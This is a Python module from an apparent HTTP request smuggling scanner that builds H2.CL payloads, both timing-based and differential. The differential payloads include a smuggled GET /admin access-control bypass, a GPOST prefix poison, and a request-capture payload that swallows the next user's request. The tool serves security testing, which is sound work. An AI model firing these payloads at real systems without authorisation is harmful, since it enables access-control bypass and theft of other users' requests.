"""H2.CL (HTTP/2 Content-Length injection) payload generator.

In H2.CL smuggling:
- Client sends HTTP/2 request with injected Content-Length header
- Frontend downgrades to HTTP/1.1 for backend
- Backend uses injected Content-Length for request boundary
- Extra data in body becomes smuggled request

HTTP/2 doesn't use Content-Length for framing (uses frame length),
but some proxies pass it through when downgrading to HTTP/1.1.
"""

from typing import List, Optional, Tuple
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class H2CLPayloadGenerator(PayloadGenerator):
    """Generator for H2.CL smuggling payloads.
    
    These payloads exploit HTTP/2 to HTTP/1.1 downgrade scenarios
    where Content-Length is injected and honored by the backend.
    """
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.H2_CL
    
    @property
    def name(self) -> str:
        return "H2.CL Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.CL timing-based detection payloads.
        
        These payloads inject Content-Length that doesn't match actual body,
        causing backend to wait for more data.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # H2.CL timing: Inject CL larger than actual body
        # Backend waits for more data that never comes
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", "100"),  # Injected: claims 100 bytes
        ]
        body1 = b"x=1"  # Only 3 bytes actually sent
        
        payloads.append(Payload(
            name="H2.CL-timing-oversize-cl",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers1, body1),
            description="H2.CL with Content-Length larger than body",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend waits for 100 bytes, only receives 3",
            expected_timeout=10.0,
            metadata={
                "h2_headers": headers1,
                "body": body1,
                "injected_cl": 100,
                "actual_length": 3,
            },
        ))
        
        # H2.CL timing with chunked terminator
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", "5"),
        ]
        body2 = b"0\r\n\r\n"  # Chunked terminator
        
        payloads.append(Payload(
            name="H2.CL-timing-chunked-term",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers2, body2),
            description="H2.CL with chunked terminator body",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend may parse as chunked, wait for more",
            expected_timeout=5.0,
            metadata={
                "h2_headers": headers2,
                "body": body2,
            },
        ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.CL differential detection payloads.
        
        These payloads inject Content-Length that excludes smuggled request,
        causing backend to process smuggled portion as separate request.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # H2.CL differential: Smuggle GET /404
        smuggled = b"GET /h2_smuggled HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
        visible_body = b"x=1\r\n"
        full_body = visible_body + smuggled
        
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(visible_body))),  # Only covers visible part
        ]
        
        payloads.append(Payload(
            name="H2.CL-differential-404",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers1, full_body),
            description="H2.CL smuggle GET /h2_smuggled request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives response for /h2_smuggled",
            poison_prefix="GET /h2_smuggled",
            metadata={
                "h2_headers": headers1,
                "visible_body": visible_body,
                "smuggled_body": smuggled,
                "injected_cl": len(visible_body),
            },
        ))
        
        # H2.CL smuggle request to /admin
        smuggled2 = (
            b"GET /admin HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"X-Smuggled: true\r\n"
            b"\r\n"
        )
        visible_body2 = b"data=test"
        full_body2 = visible_body2 + smuggled2
        
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(visible_body2))),
        ]
        
        payloads.append(Payload(
            name="H2.CL-differential-admin",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers2, full_body2),
            description="H2.CL smuggle GET /admin request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives /admin response (ACL bypass)",
            poison_prefix="GET /admin",
            metadata={
                "h2_headers": headers2,
                "visible_body": visible_body2,
                "smuggled_body": smuggled2,
            },
        ))
        
        # H2.CL with GPOST prefix
        smuggled3 = b"G"
        visible_body3 = b"0\r\n\r\n"
        full_body3 = visible_body3 + smuggled3
        
        headers3 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(visible_body3))),
        ]
        
        payloads.append(Payload(
            name="H2.CL-differential-gpost",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers3, full_body3),
            description="H2.CL smuggle 'G' to create GPOST",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next POST becomes GPOST",
            poison_prefix="G",
            metadata={
                "h2_headers": headers3,
                "visible_body": visible_body3,
                "smuggled_body": smuggled3,
            },
        ))
        
        # H2.CL request capture payload
        capture_body = (
            b"POST /capture HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 500\r\n"
            b"\r\n"
            b"captured="
        )
        visible_body4 = b"x=1"
        full_body4 = visible_body4 + capture_body
        
        headers4 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(visible_body4))),
        ]
        
        payloads.append(Payload(
            name="H2.CL-differential-capture",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers4, full_body4),
            description="H2.CL smuggle request that captures next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request is captured as body",
            poison_prefix="POST /capture",
            metadata={
                "h2_headers": headers4,
                "capture_length": 500,
            },
        ))
        
        return payloads
    
    def _serialize_h2_request(
        self,
        headers: List[Tuple[str, str]],
        body: Optional[bytes] = None,
    ) -> bytes:
        """Serialize H2 request info for storage.
        
        Note: Actual HTTP/2 framing is done by HTTP2RawClient.
        This returns a representation that can be used to reconstruct
        the request when sending.
        """
        # Create a pseudo-representation for storage
        # The actual sending uses HTTP2RawClient
        header_lines = []
        for name, value in headers:
            header_lines.append(f"{name}: {value}")
        
        result = "\r\n".join(header_lines) + "\r\n\r\n"
        
        if body:
            return result.encode() + body
        return result.encode()

